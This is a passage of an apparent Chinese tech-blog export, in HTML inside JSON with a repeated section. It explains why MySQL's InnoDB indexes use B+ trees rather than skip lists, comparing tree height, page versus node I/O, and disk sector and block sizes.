除操作可能需要进行节点的分裂和合并，这会导致性能开销较大。</p>\n</li>\n<li><p>高度不稳定：B+Tree的高度通常比较大，<strong>可能需要多次磁盘I&#x2F;O才</strong>能访问叶子节点，对于某些特定查询可能效率不高。</p>\n</li>\n</ul>\n<h2 id=\"跳表\"><a href=\"#跳表\" class=\"headerlink\" title=\"跳表\"></a>跳表</h2><h3 id=\"跳表的原理\"><a href=\"#跳表的原理\" class=\"headerlink\" title=\"跳表的原理\"></a>跳表的原理</h3><p>跳表是一种采用了用空间换时间思想的数据结构。</p>\n<p>跳表会随机地将一些节点提升到更高的层次，以创建一种逐层的数据结构，以提高操作的速度。</p>\n<h3 id=\"跳表的结构\"><a href=\"#跳表的结构\" class=\"headerlink\" title=\"跳表的结构\"></a>跳表的结构</h3><p>跳表的做法就是给链表做索引，而且是分层索引，</p>\n<h3 id=\"单层跳表\"><a href=\"#单层跳表\" class=\"headerlink\" title=\"单层跳表\"></a>单层跳表</h3><p>单层跳表, 可以退化到一个链表</p>\n<p>查找的时间复杂度是 O（N）</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/3.png\"></p>\n<h3 id=\"两层跳表\"><a href=\"#两层跳表\" class=\"headerlink\" title=\"两层跳表\"></a>两层跳表</h3><p>两层跳表 &#x3D; 原始链表 + 一层索引</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/4.png\"></p>\n<h3 id=\"两层跳表查询\"><a href=\"#两层跳表查询\" class=\"headerlink\" title=\"两层跳表查询\"></a>两层跳表查询</h3><p>如查询id&#x3D;11的数据，我们先在上层遍历，依次判断1,6,12，</p>\n<p>很快就可以判断出11在6到12之间，</p>\n<p>第二步，然后往下一跳，进入原始链表，就可以在遍历6,7,8,9,10,11之后，确定id&#x3D;11的位置。</p>\n<p>通过第一级索引，直接将查询范围从原来的1到11，缩小到现在的1,6,7,8,9,10,11。</p>\n<h3 id=\"三层跳表\"><a href=\"#三层跳表\" class=\"headerlink\" title=\"三层跳表\"></a>三层跳表</h3><p>三层跳表 &#x3D; 原始链表 + 第一层索引 + 第二层索引</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/5.png\"></p>\n<h3 id=\"三层跳表查询\"><a href=\"#三层跳表查询\" class=\"headerlink\" title=\"三层跳表查询\"></a>三层跳表查询</h3><p>如果还是查询id&#x3D;11的数据，就只需要查询1,6,9,10,11就能找到，比两层的时候更快一些。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/6.png\"></p>\n<h3 id=\"跳表查找的时间复杂度\"><a href=\"#跳表查找的时间复杂度\" class=\"headerlink\" title=\"跳表查找的时间复杂度\"></a>跳表查找的时间复杂度</h3><p>在一个单链表中查询某个数据的时间复杂度是 O(n)。也就是说，单层的跳表， 时间复杂度是 O(n)。</p>\n<p>跳表 就是 为链表 增加多级索引， 完成空间换时间， 实现 时间复杂度是 O(logn)。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/7.png\"><br>这个时间复杂度的分析方法比较难想到。</p>\n<p>先问题分解一下，先来看这样一个问题，如果链表里有 n 个结点，会有多少级索引呢？</p>\n<p>在跳表中，假设每两个结点，会抽出一个结点作为上一级索引的结点。</p>\n<p>那么，索引有多少级，每一级有多少个node呢：</p>\n<ul>\n<li><p>第一级索引的结点个数大约就是 n&#x2F;2，</p>\n</li>\n<li><p>第二级索引的结点个数大约就是 n&#x2F;4，</p>\n</li>\n<li><p>第三级索引的结点个数大约就是 n&#x2F;8，</p>\n</li>\n</ul>\n<p>依次类推，也就是说，</p>\n<ul>\n<li><p>第 k 级索引的结点个数是第 k-1 级索引的结点个数的 1&#x2F;2，</p>\n</li>\n<li><p>那第 k级索引结点的个数就是 n&#x2F;(2的k次方)。</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/8.png\"><br>假设索引有 h 级，最高级的索引有 2 个结点。</p>\n<p>通过上面的公式，我们可以得到 n&#x2F;(2^h)&#x3D;2，从而求得 h&#x3D;log2n-1。</p>\n<p>如果包含原始链表这一层，整个跳表的高度就是 log2n。</p>\n<p>我们在跳表中查询某个数据的时候，如果每一层都要遍历 m 个结点，那在跳表中查询一个数据的时间复杂度就是 O(m*logn)。</p>\n<p>那m到底是多少呢?</p>\n<p>假设我们要查找的数据是 x，在第 k 级索引中，我们遍历到 y 结点之后，发现 x 大于 y，小于后面的结点 z，所以我们通过 y 的 down 指针，从第 k 级索引下降到第 k-1 级索引。</p>\n<p>在第 k-1 级索引中，y 和 z 之间只有 3 个结点（包含 y 和 z），所以，我们在 K-1 级索引中最多只需要遍历 3 个结点，依次类推，每一级索引都最多只需要遍历 3 个结点。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/9.png\"><br>过上面的分析，我们得到 m&#x3D;3，</p>\n<p>所以在跳表中查询任意数据的时间复杂度就是 O(logn)。</p>\n<p>这个查找的时间复杂度跟二分查找是一样的，这也体现了空间换时间的效率之高。</p>\n<h3 id=\"跳表-Skip-List-的优点和缺点\"><a href=\"#跳表-Skip-List-的优点和缺点\" class=\"headerlink\" title=\"跳表(Skip List)的优点和缺点\"></a>跳表(Skip List)的优点和缺点</h3><p>跳表是一种多层级的数据结构，每一层都是一个有序链表，</p>\n<p>最底层包含所有数据，而上层包含的数据是下层的子集，通过跳跃节点快速定位目标数据。</p>\n<p><strong>跳表(Skip List)的优点</strong></p>\n<ul>\n<li><p>平均<strong>查找时间较低</strong>：跳表的查询时间复杂度为O(log n)，与平衡树结构相似，但实现起来较为简单。</p>\n</li>\n<li><p>插入和删除操作相对较快：由于跳表不需要进行节点的频繁平衡调整，插入和删除操作的性能较好。</p>\n</li>\n</ul>\n<p><strong>跳表(Skip List)的缺点</strong></p>\n<ul>\n<li><p>难以实现<strong>事务和数据持久性</strong>：跳表的更新操作可能涉及多个层级，实现事务和数据持久性要求更复杂。</p>\n</li>\n<li><p>空间开销较大：跳表需要额外的指针来连接不同层级，占用的内存空间较多。</p>\n</li>\n</ul>\n<h2 id=\"B-Tree-和-跳表-Skip-List-的在数据结构上的区别\"><a href=\"#B-Tree-和-跳表-Skip-List-的在数据结构上的区别\" class=\"headerlink\" title=\"B+Tree 和 跳表(Skip List) 的在数据结构上的区别\"></a>B+Tree 和 跳表(Skip List) 的在数据结构上的区别</h2><p>都是 多级索引 +链表</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/10.png\"></p>\n<h3 id=\"IO-操作的单位-不同\"><a href=\"#IO-操作的单位-不同\" class=\"headerlink\" title=\"IO 操作的单位 不同\"></a>IO 操作的单位 不同</h3><p>B+Tree 是page （16K）</p>\n<p>跳表(Skip List) 是 node 节点 ，一个node 几十个字节</p>\n<h3 id=\"树的高度-不同\"><a href=\"#树的高度-不同\" class=\"headerlink\" title=\"树的高度 不同\"></a>树的高度 不同</h3><p><strong>B+树</strong>是多叉树结构，每个结点都是一个<code>16k</code>的数据页，能存放较多索引信息。</p>\n<p>同样的数据，树的高度比较小。 三层B+左右就可以存储2kw左右的数据。</p>\n<p>如果，把三层B+树塞满，那大概需要2kw左右的数据。 也就是说查询一次数据，如果这些数据页都在磁盘里，那么<strong>最多需要查询三次磁盘IO</strong>。</p>\n<p>跳表是链表结构，一条数据一个结点，</p>\n<p>如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，</p>\n<p>所以，2kw数据的跳表大概高度在24层左右。 如果要一个节点要进行一次磁盘IO，大概要进行 24次。</p>\n<h2 id=\"B-Tree-和-跳表-Skip-List-的新增数据区别\"><a href=\"#B-Tree-和-跳表-Skip-List-的新增数据区别\" class=\"headerlink\" title=\"B+Tree 和 跳表(Skip List) 的新增数据区别\"></a>B+Tree 和 跳表(Skip List) 的新增数据区别</h2><p>了解了二者的基本情况之后，接下来，对B+Tree 和 跳表(Skip List) 的数据插入进行对比。</p>\n<p>B+Tree和跳表的叶子层，都包含了所有的数据，且叶子层都是顺序的，适合用于范围查询。</p>\n<p>来看看，B+Tree和跳表新增和删除数据的差异</p>\n<h3 id=\"B-Tree-新增数据\"><a href=\"#B-Tree-新增数据\" class=\"headerlink\" title=\"B+Tree 新增数据\"></a>B+Tree 新增数据</h3><p><strong>场景1： 叶子结点和索引结点都没满</strong></p>\n<p>B+Tree 直接插入到叶子结点中就好了。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/11.png\"><br><strong>场景2：叶子结点满了，但索引结点没满</strong></p>\n<p>B+Tree 需要拆分叶子结点，同时索引结点要增加新的索引信息。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/12.png\"><br><strong>场景3：叶子结点满了，且索引结点也满了</strong></p>\n<p>叶子和索引结点都要拆分，同时往上还要再<strong>加一层索引。</strong></p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/13.png\"><br>B+树是一种多叉平衡二叉树，要维护各个分支的高度差距，不能太大，平衡意味着子树们的高度层级尽量一致（一般最多差一个层级）。</p>\n<p>为啥要平衡呢？平衡意味着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。</p>\n<p>所以，为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 <strong>数据页的 分裂</strong>。</p>\n<h3 id=\"跳表新增数据\"><a href=\"#跳表新增数据\" class=\"headerlink\" title=\"跳表新增数据\"></a>跳表新增数据</h3><p>跳表同样也是很多层，新增一个数据时，最底层的链表需要插入数据，</p>\n<p>然后，考虑是否需要在上面几层中加入数据做索引 ？ 这个就靠<strong>随机函数</strong>了。</p>\n<p>例如: 如果跳表中插入数据id&#x3D;6，且随机函数返回第三层（有25%的概率），那就需要在跳表的最底层到第三层都插入数据。</p>\n<p>跳表跟B+树不一样，跳表是否新增层数，纯粹靠随机函数，不太关心平衡的问题。</p>\n<h2 id=\"B-Tree和跳表的在新增数据上的区别\"><a href=\"#B-Tree和跳表的在新增数据上的区别\" class=\"headerlink\" title=\"B+Tree和跳表的在新增数据上的区别\"></a>B+Tree和跳表的在新增数据上的区别</h2><h4 id=\"B-Tree-需要维护-树的平衡\"><a href=\"#B-Tree-需要维护-树的平衡\" class=\"headerlink\" title=\"B+Tree 需要维护 树的平衡\"></a>B+Tree 需要维护 树的平衡</h4><p>为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 <strong>数据页的 分裂</strong>。</p>\n<p>维护平衡意味维护搜索的稳定性， 意味着着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。</p>\n<h4 id=\"跳表-需要不太关心平衡问题\"><a href=\"#跳表-需要不太关心平衡问题\" class=\"headerlink\" title=\"跳表 需要不太关心平衡问题\"></a>跳表 需要不太关心平衡问题</h4><p>跳表在新增数据 时，不太关心平衡的问题。跳表插入数据的时候，跟B+树不一样，是否新增层数，纯粹靠随机函数去决定。</p>\n<h2 id=\"为什么B-Tree-采用Page作为-IO操作的单位？\"><a href=\"#为什么B-Tree-采用Page作为-IO操作的单位？\" class=\"headerlink\" title=\"为什么B+Tree 采用Page作为 IO操作的单位？\"></a>为什么B+Tree 采用Page作为 IO操作的单位？</h2><p>前面讲到，B+Tree和跳表 IO 操作的单位 不同</p>\n<ul>\n<li><p>B+Tree 是page （16K） ,粗粒度IO</p>\n</li>\n<li><p>跳表(Skip List) 是 node 节点 ，一个node 几十个字节 , 细粒度IO</p>\n</li>\n</ul>\n<p>这是和 Mysql的存储介质有关系， Mysql的数据需要持久化存储， 并且需要事务机制保证持久性，所以，必须存储在磁盘上。</p>\n<h3 id=\"内存和磁盘的访问速度对比\"><a href=\"#内存和磁盘的访问速度对比\" class=\"headerlink\" title=\"内存和磁盘的访问速度对比\"></a>内存和磁盘的访问速度对比</h3><p>机械硬盘的读写速度，大致如下</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/14.png\"><br>固态硬盘的读写速度，大致如下</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/15.png\"><br>内存的读写速度，和磁盘读写速度的对比</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/16.png\"><br>为什么磁盘慢，和磁盘的结构有关。</p>\n<h3 id=\"机械硬盘的扇区（sector）\"><a href=\"#机械硬盘的扇区（sector）\" class=\"headerlink\" title=\"机械硬盘的扇区（sector）\"></a>机械硬盘的扇区（sector）</h3><p>机械硬盘的性能为啥那么慢？ 看看结构就知道：</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/17.png\"><br>机械磁盘上的每个磁道被等分为若干个弧段，这些弧段称之为扇区。</p>\n<p>如何在磁盘中读&#x2F;写数据？ 需要 物理动作，去移动 “磁头” 到目标 扇区</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/18.png\"><br>机械磁盘的读写以扇区为基本单位。</p>\n<p>硬盘的物理读写以扇区为基本单位。通常情况下每个扇区的大小是 512 字节。linux 下可以使用 <code>fdisk -l</code> 了解扇区大小：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo /sbin/fdisk -l  </span><br><span class=\"line\">Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors  </span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes  </span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes  </span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes  </span><br><span class=\"line\">Disklabel type: dos  </span><br><span class=\"line\">Disk identifier: 0x7d9f5643  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中 Sector size，就是扇区大小，本例中为 512 bytes。</p>\n<p>注意，扇区是磁盘物理层面的概念，不是操作系统的概率。</p>\n<p>操作系统是不直接与扇区交互的，而是与多个连续扇区组成的磁盘块交互。由于扇区是物理层面的概念，所以无法在系统中进行大小的更改。</p>\n<h3 id=\"操作系统-IO-块-Block\"><a href=\"#操作系统-IO-块-Block\" class=\"headerlink\" title=\"操作系统 IO 块 Block\"></a>操作系统 IO 块 Block</h3><p>文件系统读写数据的最小单位，也叫磁盘簇，IO区块 BLOC。</p>\n<p>什么是IO 块 Block？ 扇区是磁盘最小的物理存储单元，操作系统将相邻的扇区组合在一起，形成一个块，对块进行管理。</p>\n<p>每个Block 磁盘块可以包括 2、4、8、16、32 或 64 个扇区。</p>\n<p>所以，Block 磁盘块是操作系统所使用的逻辑概念，而非磁盘的物理概念。</p>\n<p>Block 磁盘块的大小可以通过命令 <code>stat /boot</code> 来查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo stat /boot  </span><br><span class=\"line\">  File: /boot  </span><br><span class=\"line\">  Size: 4096        Blocks: 8          IO Block: 4096   directory  </span><br><span class=\"line\">Device: 801h/2049d  Inode: 655361      Links: 3  </span><br><span class=\"line\">Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)  </span><br><span class=\"line\">Access: 2019-07-06 20:19:45.487160301 +0800  </span><br><span class=\"line\">Modify: 2019-07-06 20:19:44.835160301 +0800  </span><br><span class=\"line\">Change: 2019-07-06 20:19:44.835160301 +0800  </span><br><span class=\"line\"> Birth: -  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中 IO Block 就是磁盘块大小，本例中是 4096 Bytes，一般也是 4K。</p>\n<h3 id=\"Mysql的InnoDB-Page-数据页\"><a href=\"#Mysql的InnoDB-Page-数据页\" class=\"headerlink\" title=\"Mysql的InnoDB Page 数据页\"></a>Mysql的InnoDB Page 数据页</h3><p>磁盘IO是低性能的，如何提升性能， 最好是 减少IO， 基于时间局部性和空间局部性原理， 一次读取足够多的数据到内存。</p>\n<p>Mysql的 InnoDB将数据划分为若干页，以Page 页作为磁盘与内存交互的基本单位，一般页的大小为16KB。</p>\n<p>InnoDB，为了通过减少内存与磁盘的交互次数，把一次读取和写入的 数据量， 从4K 扩大到了16K，也就是一次操作 4个 OS Block，从而提升性能。</p>\n<p>这样的话，一次性至少读取1Page 页数据到内存中或者将1 Page页数据写入磁盘。而不是一个操作系统的block。</p>\n<p>Page 本质上就是一种典型的缓存设计思想，一般缓存的设计基本都是从时间局部性和空间局部性进行考量的：</p>\n<ul>\n<li><p>时间局部性：如果一条数据正在在被使用，那么在接下来一段时间内大概率还会再被使用。可以认为热点数据缓存都属于这种思路的实现。</p>\n</li>\n<li><p>空间局部性：如果一条数据正在在被使用，那么存储在它附近的数据大概率也会很快被使用。InnoDB的数据页和操作系统的页缓存则是这种思路的体现。</p>\n</li>\n</ul>\n<p>InnoDB Page 数据页的结构</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/19.png\"><br>一开始生成页的时候，并没有User Records这个部分.</p>\n<p>每当我们插⼊⼀条记录，都会从Free Space部分，也就是尚未使⽤的存储空间中申请⼀个记录⼤⼩的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使⽤完了，如果还有新的记录插⼊的话，就需要去申请新的页了。</p>\n<h3 id=\"一次IO一个page的优势\"><a href=\"#一次IO一个page的优势\" class=\"headerlink\" title=\"一次IO一个page的优势\"></a>一次IO一个page的优势</h3><p>MySQL的InnoDB存储引擎使用B+树而不是跳表，这是因为B+树一次IO一个page，大大节省了磁盘IO的操作。</p>\n<p>如果使用跳表，那么一个node节点一次io， 存储的性能 估计要下降1000倍以上。</p>\n<h2 id=\"总结：Mysql的索引为什么使用B-树而不使用跳表\"><a href=\"#总结：Mysql的索引为什么使用B-树而不使用跳表\" class=\"headerlink\" title=\"总结：Mysql的索引为什么使用B+树而不使用跳表\"></a>总结：Mysql的索引为什么使用B+树而不使用跳表</h2><h3 id=\"B-树更适合磁盘IO\"><a href=\"#B-树更适合磁盘IO\" class=\"headerlink\" title=\"B+树更适合磁盘IO\"></a>B+树更适合磁盘IO</h3><p><strong>B+Tree</strong>一个节点是一个page，是一种多叉树结构，每个结点都是一个16k的数据页，能存放较多索引信息。一次IO一个page，大大节省了磁盘IO的操作。</p>\n<p><strong>B+Tree</strong>一个page 能存放较多索引信息 ，所以树的层数比较低， <strong>三层</strong>左右就可以存储<code>2kw</code>左右的数据也就是说查询一次数据，如果这些数据页都在磁盘里，那么最多需要查询<strong>三次磁盘IO</strong>。</p>\n<h3 id=\"原生跳表不适合磁盘IO\"><a href=\"#原生跳表不适合磁盘IO\" class=\"headerlink\" title=\"原生跳表不适合磁盘IO\"></a>原生跳表不适合磁盘IO</h3><p><strong>跳表</strong>是链表结构，一条数据一个结点，那么一个node节点一次磁盘io， 一个page 页规模的IO存储的性能 估计要下降1000倍以上。</p>\n<p>原生跳表 一个node存放一个 索引信息 ，所以树的层数比较高</p>\n<p>如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，</p>\n<p>所以，2kw数据的跳表大概高度在24层左右。 如果要进行查找，大概要进行 24次磁盘IO。</p>\n<blockquote>\n<p>这里讲的是原生跳表， 如果经过各种改进，那个不在此文讨论范围。</p>\n</blockquote>\n<p>所以，虽然在理论上，跳表的时间复杂度和B+树相同 ，但是：</p>\n<ul>\n<li><p>B+树更适合 磁盘IO， 更合适MYSQL。</p>\n</li>\n<li><p>从反面来说， 跳表更适合内存IO， 更适合redis。</p>\n</li>\n</ul>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<h1 id=\"字节面试：-Mysql为什么用B-树，不用跳表？\"><a href=\"#字节面试：-Mysql为什么用B-树，不用跳表？\" class=\"headerlink\" title=\"字节面试： Mysql为什么用B+树，不用跳表？\"></a>字节面试： Mysql为什么用B+树，不用跳表？</h1><p><strong>最近有小伙伴在蚂蚁、面试字节，都问到了相关的面试题，可以说是逢面必问。</strong></p>\n<p>小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。</p>\n<h2 id=\"索引的作用和重要性\"><a href=\"#索引的作用和重要性\" class=\"headerlink\" title=\"索引的作用和重要性\"></a>索引的作用和重要性</h2><p>索引是帮助MySQL高效获取数据的数据结构，注意，是帮助高性能的获取数据</p>\n<p>索引好比是一本书的目录，可以直接根据页码找到对应的内容，目的就是为了<code>加快数据库的查询速度</code>。</p>\n<ul>\n<li><p>索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。</p>\n</li>\n<li><p>索引是一种能帮助mysql提高了查询效率的数据结构：<strong>索引数据结构</strong>。</p>\n</li>\n</ul>\n<p>索引的存储原理大致可以概括为一句话：<strong>以空间换时间</strong>。</p>\n<p>数据库在未添加索引, 进行查询的时候默认是进行全文搜索，也就是说有多少数据就进行多少次查询，然后找到相应的数据就把它们放到结果集中，直到全文扫描完毕。</p>\n<p>数据库添加了索引之后，通过索引快速找到数据在磁盘上的位置，可以快速的读取数据，而不同从头开始全表扫描。</p>\n<p>一般来说索引本身也很大，不可能全部存储在内存中，因此索引往往是存储在磁盘上的文件中的（可能存储在单独的索引文件中，也可能和数据一起存储在数据文件中）。</p>\n<h3 id=\"索引的作用和重要性-1\"><a href=\"#索引的作用和重要性-1\" class=\"headerlink\" title=\"索引的作用和重要性\"></a>索引的作用和重要性</h3><ul>\n<li><p>加快数据检索速度</p>\n<p>索引允许数据库系统快速定位到符合查询条件的记录，从而显著提高查询操作的效率。</p>\n</li>\n<li><p>降低数据库IO成本</p>\n<p>通过索引，数据库在查询时需要读取的数据量减少，这样可以减少磁盘IO操作的次数和压力，进而提升整体的数据库性能。</p>\n</li>\n<li><p>保证数据的完整性</p>\n<p>索引可以包含唯一性约束，这有助于确保表中数据的唯一性，防止出现重复记录。</p>\n</li>\n<li><p>加速表连接</p>\n<p>在涉及多表查询时，索引可以帮助加速表与表之间的连接操作，实现表与表之间的参照完整性。</p>\n</li>\n<li><p>优化排序和分组操作</p>\n<p>当使用分组、排序等操作进行数据检索时，索引可以显著减少处理的数据量，从而提高这些操作的效率。</p>\n</li>\n</ul>\n<h2 id=\"B-数和跳表的整体结构\"><a href=\"#B-数和跳表的整体结构\" class=\"headerlink\" title=\"B+数和跳表的整体结构\"></a>B+数和跳表的整体结构</h2><p>整体上，B+数和跳表 都是 链表+ 多级索引组合 的结构</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/1.png\"></p>\n<h4 id=\"什么是MySQL中的B-Tree\"><a href=\"#什么是MySQL中的B-Tree\" class=\"headerlink\" title=\"什么是MySQL中的B+Tree\"></a>什么是MySQL中的B+Tree</h4><p>MySQL中的B+Tree 原理</p>\n<ul>\n<li><p>B+Tree一般由多个页、多层级组成，在MySQL中每个页 16 KB。</p>\n</li>\n<li><p>主键索引的 B+ 树的叶子结点才是数据，非叶子结点（内节点）存放的是索引信息。</p>\n</li>\n<li><p>上下层的页通过单指针相连。</p>\n</li>\n<li><p>同一层级的相邻的数据页通过双指针相邻。</p>\n</li>\n<li><p>B+Tree的结构</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/2.png\"></p>\n<h3 id=\"B-Tree的查询过程\"><a href=\"#B-Tree的查询过程\" class=\"headerlink\" title=\"B+Tree的查询过程\"></a>B+Tree的查询过程</h3><p>B+Tree是由多个页组成的多层级结构，每个页16kb，对于主键索引来说，最末级的叶子节点放行数据，</p>\n<p>非叶子节点放的是索引信息(主键ID和页号),用于加速查询。</p>\n<p>我们想要查询数据5，会从顶层页的record开始，record里包含了主键Id和页号(页地址),</p>\n<p>顶层页 向左最小id是1，最右最小id是7，</p>\n<p>那id&#x3D;5的数据如果存在，那必定在顶层页 左边箭头，于是顺着的record的页地址就到了<code>6号</code>数据页里，</p>\n<p>再判断id&#x3D;5&gt;4，所以肯定在右边的数据页里，于是加载<code>105号</code>数据页。</p>\n<p>在<code>105号数据页</code>里，虽然有多行数据，但也<strong>不是挨个遍历的</strong>，数据页内还有个<strong>页目录</strong>的信息，里边是有序的。</p>\n<p>所以，数据页内可以通过<strong>二分查找</strong>的方式加速查询行数据，于是找到id&#x3D;5的数据行，完成查询。</p>\n<p>从上面可以看出，B+Tree利用了<strong>空间换时间的</strong>方式，**将查询时间复杂度从O(n)优化为O(lg(n))**。</p>\n<h3 id=\"B-Tree的优点和缺点\"><a href=\"#B-Tree的优点和缺点\" class=\"headerlink\" title=\"B+Tree的优点和缺点\"></a>B+Tree的优点和缺点</h3><ul>\n<li><p>B+Tree是一种平衡树结构，它具有根节点、内部节点和叶子节点。</p>\n</li>\n<li><p>每个节点包含一定数量的键值对，键值对按键值大小有序排列。</p>\n</li>\n<li><p>内部节点只包含键，叶子节点同时包含键和指向数据的指针。</p>\n</li>\n</ul>\n<p><strong>B+Tree的优点</strong></p>\n<ul>\n<li><p>范围查询效率高：B+Tree支持范围查询，因为在B+Tree中，相邻的叶子节点是有序的，所以在查找范围内的数据时非常高效。</p>\n</li>\n<li><p>事务支持：B+Tree是一种多版本并发控制（MVCC）友好的数据结构，适用于事务处理场景，能够保证事务的ACID属性。</p>\n</li>\n<li><p>数据持久性：B+Tree的叶子节点包含所有数据，这意味着数据非常容易持久化到磁盘上，支持高可靠性和数据恢复。</p>\n</li>\n</ul>\n<p><strong>B+Tree的缺点</strong></p>\n<ul>\n<li><p><strong>插入和删除开销较高</strong>：由于B+Tree的平衡性质，插入和删除操作可能需要进行节点的分裂和合并，这会导致性能开销较大。</p>\n</li>\n<li><p>高度不稳定：B+Tree的高度通常比较大，<strong>可能需要多次磁盘I&#x2F;O才</strong>能访问叶子节点，对于某些特定查询可能效率不高。</p>\n</li>\n</ul>\n<h2 id=\"跳表\"><a href=\"#跳表\" class=\"headerlink\" title=\"跳表\"></a>跳表</h2><h3 id=\"跳表的原理\"><a href=\"#跳表的原理\" class=\"headerlink\" title=\"跳表的原理\"></a>跳表的原理</h3><p>跳表是一种采用了用空间换时间思想的数据结构。</p>\n<p>跳表会随机地将一些节点提升到更高的层次，以创建一种逐层的数据结构，以提高操作的速度。</p>\n<h3 id=\"跳表的结构\"><a href=\"#跳表的结构\" class=\"headerlink\" title=\"跳表的结构\"></a>跳表的结构</h3><p>跳表的做法就是给链表做索引，而且是分层索引，</p>\n<h3 id=\"单层跳表\"><a href=\"#单层跳表\" class=\"headerlink\" title=\"单层跳表\"></a>单层跳表</h3><p>单层跳表, 可以退化到一个链表</p>\n<p>查找的时间复杂度是 O（N）</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/3.png\"></p>\n<h3 id=\"两层跳表\"><a href=\"#两层跳表\" class=\"headerlink\" title=\"两层跳表\"></a>两层跳表</h3><p>两层跳表 &#x3D; 原始链表 + 一层索引</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/4.png\"></p>\n<h3 id=\"两层跳表查询\"><a href=\"#两层跳表查询\" class=\"headerlink\" 